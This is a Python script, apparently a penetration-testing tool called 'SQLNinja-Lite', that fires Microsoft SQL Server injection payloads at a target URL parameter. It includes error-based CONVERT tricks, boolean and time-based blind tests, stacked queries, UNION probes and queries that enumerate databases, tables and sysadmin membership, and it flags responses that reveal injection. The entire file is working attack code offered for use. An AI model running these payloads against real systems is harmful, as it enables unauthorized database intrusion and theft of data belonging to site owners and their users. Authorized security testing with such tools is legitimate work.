#!/usr/bin/env python3
"""MS SQL injection tool: test for SQL injection with MSSQL-specific payloads and techniques."""
import argparse, sys, urllib.parse
try:
    import requests; HAS_REQ = True
except ImportError: HAS_REQ = False

PAYLOADS = {
    "error_based": ["' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=CONVERT(int,(SELECT DB_NAME()))--","' AND 1=CONVERT(int,(SELECT SYSTEM_USER))--"],
    "blind_boolean": ["' AND 1=1--","' AND 1=2--",
        "' AND (SELECT COUNT(*) FROM sysobjects)>0--","' AND (SELECT IS_SRVROLEMEMBER('sysadmin'))=1--"],
    "time_based": ["'; WAITFOR DELAY '0:0:3'--","' IF(1=1) WAITFOR DELAY '0:0:3'--"],
    "stacked": ["'; SELECT @@version--","'; SELECT name FROM master.dbo.sysdatabases--"],
    "union": ["' UNION SELECT NULL--","' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--","' UNION SELECT 1,@@version,3,4--"],
    "info": ["' UNION SELECT name,NULL FROM master..sysdatabases--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--"],
}
ERRORS = ["microsoft sql server","unclosed quotation","incorrect syntax near","nvarchar",
          "conversion failed","oledb","odbc","sql native client"]

def test(url, param, payload, method, timeout):
    if not HAS_REQ: return None, "no requests"
    try:
        if method == "GET":
            p = urllib.parse.urlparse(url); params = dict(urllib.parse.parse_qsl(p.query))
            params[param] = payload; q = urllib.parse.urlencode(params)
            r = requests.get(urllib.parse.urlunparse(p._replace(query=q)), timeout=timeout,
                             allow_redirects=False, headers={"User-Agent":"Mozilla/5.0"})
        else:
            r = requests.post(url, data={param:payload}, timeout=timeout,
                              allow_redirects=False, headers={"User-Agent":"Mozilla/5.0"})
        return r, None
    except requests.exceptions.Timeout: return None, "TIMEOUT"
    except Exception as e: return None, str(e)

def main():
    parser = argparse.ArgumentParser(description="MSSQL injection tester")
    parser.add_argument("target", help="Target URL")
    parser.add_argument("-p","--param", required=True)
    parser.add_argument("-m","--method", default="GET", choices=["GET","POST"])
    parser.add_argument("-t","--timeout", type=float, default=10)
    parser.add_argument("--category", choices=list(PAYLOADS.keys()))
    parser.add_argument("--list-payloads", action="store_true")
    args = parser.parse_args()
    print(f"[*] SQLNinja-Lite - MSSQL Injection\n[*] Target: {args.target}\n[*] Param: {args.param}\n")
    if args.list_payloads:
        for cat, pls in PAYLOADS.items():
            print(f"\n=== {cat} ===")
            for p in pls: print(f"  {p}")
        return
    if not HAS_REQ:
        print("[!] requests required. Payloads for manual testing:\n")
        for cat, pls in PAYLOADS.items():
            print(f"=== {cat} ===")
            for p in pls: print(f"  {urllib.parse.quote(p)}")
        return
    bl, err = test(args.target, args.param, "1", args.method, args.timeout)
    if err: print(f"[!] Baseline failed: {err}"); sys.exit(1)
    bl_len, bl_code = len(bl.text), bl.status_code
    print(f"[*] Baseline: HTTP {bl_code}, {bl_len}B\n")
    findings = []
    cats = [args.category] if args.category else list(PAYLOADS.keys())
    for cat in cats:
        print(f"=== {cat} ===")
        for payload in PAYLOADS[cat]:
            r, err = test(args.target, args.param, payload, args.method, args.timeout)
            if err == "TIMEOUT" and cat == "time_based":
                print(f"  [+] TIMEOUT (blind confirmed): {payload[:50]}")
                findings.append((cat, payload)); continue
            if err: continue
            errs = [e for e in ERRORS if e in r.text.lower()]
            if errs:
                print(f"  [+] SQL errors: {', '.join(errs[:3])}")
                print(f"      {payload[:55]}"); findings.append((cat, payload))
            elif r.status_code != bl_code:
                print(f"  [~] Status {bl_code}->{r.status_code}: {payload[:45]}")
            elif abs(len(r.text)-bl_len) > 100:
                print(f"  [~] Len diff {abs(len(r.text)-bl_len)}B: {payload[:45]}")
            else: print(f"  [-] {payload[:40]}")
        print()
    print(f"{'='*60}\n[*] Findings: {len(findings)}")
    for cat, p in findings: print(f"  [{cat}] {p[:55]}")
    if not findings: print("[*] No clear injection (manual testing recommended)")

if __name__ == "__main__":
    main()
